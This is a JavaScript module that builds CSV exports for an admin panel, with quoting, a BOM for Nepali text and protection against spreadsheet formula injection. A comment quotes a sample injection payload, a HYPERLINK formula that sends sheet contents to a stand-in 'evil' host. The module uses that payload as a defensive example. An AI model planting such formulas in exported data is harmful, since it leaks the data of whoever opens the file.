/**
 * CSV serialisation for admin exports (orders, customers, subscribers, reports).
 *
 * Every field is quoted unconditionally. Selective quoting is the usual source of
 * broken exports: a product name with a comma, an address with a newline or a
 * customer note with a quote mark all shift columns silently, and the damage is
 * only noticed after the file has been imported somewhere else.
 */

/**
 * Characters that make Excel, LibreOffice and Sheets treat a cell as a formula
 * rather than text. Quoting does not stop them - the quotes are consumed by the CSV
 * parser and whatever follows is evaluated.
 */
const FORMULA_TRIGGERS = /^[=+\-@\t\r]/;

/**
 * Neutralises spreadsheet formula injection (CWE-1236).
 *
 * Names, addresses and order notes in these exports are customer-supplied, so a
 * customer could register as `=HYPERLINK("http://evil/?"&A1,"Click")` and have it
 * run the moment an admin opens the file - exfiltrating the rest of the sheet. A
 * leading apostrophe is the portable fix: spreadsheets read it as "this is text"
 * and do not display it, while plain CSV consumers see one extra character.
 */
const defuse = (text) => (FORMULA_TRIGGERS.test(text) ? `'${text}` : text);

/** RFC 4180 escaping: wrap in quotes, double any quote inside. */
const cell = (value) => {
  if (value === null || value === undefined) return '""';
  if (value instanceof Date) return `"${value.toISOString()}"`;
  // Numbers and booleans are ours, not the customer's, and must stay numeric in Excel.
  if (typeof value === 'number' || typeof value === 'boolean') return `"${value}"`;
  return `"${defuse(String(value)).replace(/"/g, '""')}"`;
};

/**
 * `rows` is an array of arrays - the first is the header. CRLF line endings
 * because Excel on Windows is the most likely consumer here.
 */
export const toCsv = (rows = []) => rows.map((row) => row.map(cell).join(',')).join('\r\n');

/**
 * Prefixed with a UTF-8 BOM so Excel renders Devanagari product names and the
 * "रु" symbol correctly instead of mojibake. Without it, a file containing Nepali
 * text opens as garbage on most Windows installs.
 *
 * Written as a \uFEFF escape rather than the literal character on purpose: a raw BOM
 * is invisible in an editor, so a well-meaning cleanup can delete it without noticing
 * and every Nepali export silently breaks.
 */
export const csvBody = (rows) => `\uFEFF${toCsv(rows)}`;

/** Sets the download headers and sends the file in one call. */
export function sendCsv(res, { filename, rows }) {
  res.setHeader('Content-Type', 'text/csv; charset=utf-8');
  res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
  // Exports are point-in-time snapshots; a cached copy would be misleading.
  res.setHeader('Cache-Control', 'no-store');
  return res.send(csvBody(rows));
}

/** `orders-2026-09-02.csv` - dated so successive exports do not overwrite. */
export const datedFilename = (base, date = new Date()) =>
  `${base}-${date.toISOString().slice(0, 10)}.csv`;

export default { toCsv, csvBody, sendCsv, datedFilename };
